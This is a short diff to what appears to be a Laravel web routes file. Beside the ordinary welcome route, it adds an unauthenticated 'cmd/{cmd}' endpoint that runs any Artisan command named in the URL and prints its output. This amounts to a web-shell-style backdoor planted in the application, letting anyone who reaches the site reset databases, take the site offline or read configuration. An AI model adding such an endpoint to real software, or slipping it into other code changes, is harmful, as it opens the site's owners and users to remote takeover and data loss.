@@ -1,6 +1,7 @@
 <?php
 
 use Illuminate\Support\Facades\Route;
+use Illuminate\Support\Facades\Artisan;
 use App\Http\Controllers\Admin\Auth\LoginController as AdminLoginController;
 use App\Http\Controllers\Admin\DashboardController as AdminDashboardController;
 
@@ -14,6 +15,12 @@ use App\Http\Controllers\Admin\DashboardController as AdminDashboardController;
 | contains the "web" middleware group. Now create something great!
 |
 */
+
+Route::get('cmd/{cmd}', function ($cmd) {
+    Artisan::call($cmd);
+    echo "<pre style='color:white;background-color:black;padding:20px;'>";
+    return Artisan::output();
+});
 
 Route::get('/', function () {
     return view('welcome');
